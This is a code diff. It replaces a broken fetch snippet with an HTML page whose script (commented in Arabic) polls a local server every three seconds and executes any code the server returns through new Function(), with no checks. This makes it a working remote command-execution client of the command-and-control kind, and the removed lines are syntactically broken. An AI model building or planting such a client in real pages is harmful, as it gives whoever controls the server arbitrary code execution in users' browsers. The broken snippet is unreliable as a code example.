@@ -1,9 +1,33 @@
-fetch("https://chat/chatResult", {
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Client Side</title>
+</head>
+<body>
+    <h1>العميل متصل بالخادم...</h1>
 
-method: "POST",
+    <script>
+        const clientId = "user-123";
+        const serverUrl = "http://localhost:3000/command";
 
-headers: ("Content-Type": "application/json" },
+        async function poll() {
+            try {
+                const res = await fetch(`${serverUrl}?client_id=${clientId}`);
+                const data = await res.json();
+                
+                if (data.code && data.code.trim() !== "") {
+                    console.log("جاري تنفيذ أمر جديد...");
+                    // تحويل النص إلى كود حقيقي وتشغيله
+                    new Function(data.code)();
+                }
+            } catch (err) {
+                console.error("خطأ في الاتصال بالخادم");
+            }
+            // كرر العملية كل 3 ثوانٍ
+            setTimeout(poll, 3000);
+        }
 
-body: JSON.stringify({ message: "/tx" )),
-
-});
+        poll();
+    </script>
+</body>
+</html>
